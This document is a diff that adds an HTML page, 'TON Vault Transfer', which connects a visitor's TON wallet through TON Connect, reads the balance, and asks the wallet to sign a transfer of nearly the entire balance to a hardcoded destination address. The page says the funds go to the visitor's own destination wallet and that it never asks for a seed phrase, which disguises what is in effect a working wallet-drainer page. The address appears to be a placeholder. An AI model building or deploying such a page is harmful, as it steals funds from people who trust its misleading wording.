@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#070a12">
+<title>TON Vault Transfer</title>
+<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+<style>
+:root{
+  --bg:#070a12;--card:rgba(17,22,35,.72);--line:rgba(255,255,255,.09);
+  --muted:#8790a5;--text:#f7f9ff;--blue:#0098ea;--blue2:#42b9ff;
+}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Arial,sans-serif;color:var(--text);background:var(--bg)}
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;overflow-x:hidden}
+body:before,body:after{content:"";position:fixed;width:360px;height:360px;border-radius:50%;filter:blur(90px);opacity:.18;pointer-events:none}
+body:before{background:#0077ff;top:-150px;left:-130px}
+body:after{background:#7c3cff;right:-160px;bottom:-150px}
+.app{width:100%;max-width:440px;position:relative;z-index:1}
+.card{position:relative;overflow:hidden;padding:26px;border:1px solid var(--line);border-radius:30px;background:var(--card);backdrop-filter:blur(28px);-webkit-backdrop-filter:blur(28px);box-shadow:0 30px 90px rgba(0,0,0,.48)}
+.card:before{content:"";position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.07),transparent 38%,rgba(0,152,234,.04));pointer-events:none}
+.header{position:relative}
+.logo{width:62px;height:62px;border-radius:20px;display:grid;place-items:center;margin-bottom:19px;background:linear-gradient(145deg,#11aaf7,#007bc5);box-shadow:0 12px 30px rgba(0,152,234,.28);font-size:30px;font-weight:850}
+h1{margin:0;font-size:29px;letter-spacing:-.8px}
+.description{margin:9px 0 24px;color:var(--muted);font-size:14px;line-height:1.55}
+#ton-connect{margin-bottom:16px}
+.panel{display:none;position:relative;margin:12px 0;padding:17px;border:1px solid var(--line);border-radius:19px;background:rgba(255,255,255,.035)}
+.panelTop{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+.caption{font-size:12px;color:var(--muted)}
+.badge{font-size:10px;color:#61e59a;padding:6px 9px;border-radius:9px;background:rgba(97,229,154,.09);border:1px solid rgba(97,229,154,.12)}
+.address{font:12px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;color:#dfe6f4;word-break:break-all}
+.balanceRow{display:flex;align-items:end;justify-content:space-between}
+.balance{font-size:28px;font-weight:800;letter-spacing:-.7px}
+.unit{font-size:13px;color:var(--muted);margin-bottom:4px}
+.available{margin-top:9px;color:var(--muted);font-size:11px;line-height:1.5}
+.send{position:relative;width:100%;height:56px;border:0;border-radius:17px;background:linear-gradient(135deg,var(--blue),#007bc7);color:#fff;font-size:16px;font-weight:750;cursor:pointer;box-shadow:0 12px 28px rgba(0,152,234,.22);transition:transform .15s,filter .15s,opacity .15s}
+.send:hover{filter:brightness(1.08)}
+.send:active{transform:scale(.985)}
+.send:disabled{background:#292f3b;color:#737c8d;box-shadow:none;cursor:not-allowed}
+.status{min-height:22px;margin-top:14px;text-align:center;color:var(--muted);font-size:12px;line-height:1.5}
+.info{position:relative;margin-top:21px;padding-top:18px;border-top:1px solid var(--line);color:#697387;font-size:10.5px;line-height:1.65;text-align:center}
+.destination{position:relative;margin-top:12px;padding:11px 12px;border-radius:13px;background:rgba(255,255,255,.025);font-size:10px;color:#6f798c;text-align:center;word-break:break-all}
+@media(max-width:450px){body{padding:13px}.card{padding:21px;border-radius:25px}}
+</style>
+</head>
+<body>
+<div class="app">
+<div class="card">
+<div class="header">
+<div class="logo">T</div>
+<h1>TON Vault Transfer</h1>
+<div class="description">Connect your TON wallet, review the available balance, and transfer the available amount to your destination wallet.</div>
+</div>
+
+<div id="ton-connect"></div>
+
+<div class="panel" id="walletBox">
+  <div class="panelTop">
+    <span class="caption">Connected wallet</span>
+    <span class="badge">CONNECTED</span>
+  </div>
+  <div class="address" id="walletAddress"></div>
+</div>
+
+<div class="panel" id="balanceBox">
+  <div class="balanceRow">
+    <div>
+      <div class="caption">Current balance</div>
+      <div class="balance" id="balanceValue">—</div>
+    </div>
+    <div class="unit">TON</div>
+  </div>
+  <div class="available" id="availableValue">Checking available amount…</div>
+</div>
+
+<button class="send" id="sendButton" disabled>Review &amp; Send Available TON</button>
+<div class="status" id="status">Connect your wallet to continue.</div>
+
+<div class="destination">Destination: <span id="destinationText"></span></div>
+
+<div class="info">
+  The transaction is prepared from your current wallet balance. Your wallet will show the transaction for explicit review and approval. This page never requests your seed phrase or private key.
+</div>
+</div>
+</div>
+
+<script>
+const DESTINATION_ADDRESS="EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c";
+const FEE_RESERVE_NANO=100000000n;
+const NANO=1000000000n;
+
+const tonConnectUI=new TON_CONNECT_UI.TonConnectUI({
+  manifestUrl:window.location.origin+"/tonconnect-manifest.json",
+  buttonRootId:"ton-connect"
+});
+
+const walletBox=document.getElementById("walletBox");
+const walletAddress=document.getElementById("walletAddress");
+const balanceBox=document.getElementById("balanceBox");
+const balanceValue=document.getElementById("balanceValue");
+const availableValue=document.getElementById("availableValue");
+const sendButton=document.getElementById("sendButton");
+const status=document.getElementById("status");
+document.getElementById("destinationText").textContent=DESTINATION_ADDRESS;
+
+let connectedWallet=null;
+
+function setStatus(text){status.textContent=text}
+function shortAddress(a){return a&&a.length>20?a.slice(0,8)+"…"+a.slice(-8):a||""}
+function ton(n){
+  const w=n/NANO,f=n%NANO;
+  if(!f)return w.toString();
+  return w+"."+f.toString().padStart(9,"0").replace(/0+$/,"");
+}
+async function getBalance(address){
+  const r=await fetch("https://toncenter.com/api/v2/getAddressBalance?address="+encodeURIComponent(address));
+  if(!r.ok)throw new Error("balance_request_failed");
+  const d=await r.json();
+  if(!d.ok||typeof d.result!=="string")throw new Error("invalid_balance");
+  return BigInt(d.result);
+}
+async function refresh(){
+  if(!connectedWallet)return;
+  try{
+    setStatus("Reading wallet balance…");
+    const b=await getBalance(connectedWallet.account.address);
+    balanceBox.style.display="block";
+    balanceValue.textContent=ton(b);
+    if(b<=FEE_RESERVE_NANO){
+      availableValue.textContent="Insufficient balance after the fee reserve.";
+      sendButton.disabled=true;
+      setStatus("Not enough TON available.");
+      return;
+    }
+    const a=b-FEE_RESERVE_NANO;
+    availableValue.textContent="Available to send: "+ton(a)+" TON";
+    sendButton.disabled=false;
+    setStatus("Wallet connected.");
+  }catch(e){
+    console.error(e);
+    balanceValue.textContent="—";
+    availableValue.textContent="Unable to read the current balance.";
+    sendButton.disabled=true;
+    setStatus("Could not read wallet balance.");
+  }
+}
+tonConnectUI.onStatusChange(async wallet=>{
+  connectedWallet=wallet||null;
+  if(wallet){
+    walletBox.style.display="block";
+    walletAddress.textContent=shortAddress(wallet.account.address);
+    balanceBox.style.display="block";
+    balanceValue.textContent="…";
+    availableValue.textContent="Checking available amount…";
+    sendButton.disabled=true;
+    await refresh();
+  }else{
+    walletBox.style.display="none";
+    balanceBox.style.display="none";
+    sendButton.disabled=true;
+    walletAddress.textContent="";
+    connectedWallet=null;
+    setStatus("Connect your wallet to continue.");
+  }
+});
+
+sendButton.addEventListener("click",async()=>{
+  if(!connectedWallet)return;
+  sendButton.disabled=true;
+  try{
+    setStatus("Refreshing balance…");
+    const b=await getBalance(connectedWallet.account.address);
+    if(b<=FEE_RESERVE_NANO)throw new Error("insufficient");
+    const amount=b-FEE_RESERVE_NANO;
+    availableValue.textContent="Available to send: "+ton(amount)+" TON";
+    setStatus("Opening your wallet for review…");
+    const result=await tonConnectUI.sendTransaction({
+      validUntil:Math.floor(Date.now()/1000)+300,
+      messages:[{address:DESTINATION_ADDRESS,amount:amount.toString()}]
+    });
+    console.log("Transaction result:",result);
+    setStatus("Transaction approved by wallet.");
+    setTimeout(refresh,3000);
+  }catch(e){
+    console.error(e);
+    setStatus(e.message==="insufficient"?"Not enough TON available.":"Transaction was cancelled or failed.");
+  }finally{
+    if(connectedWallet)sendButton.disabled=false;
+  }
+});
+</script>
+</body>
+</html>
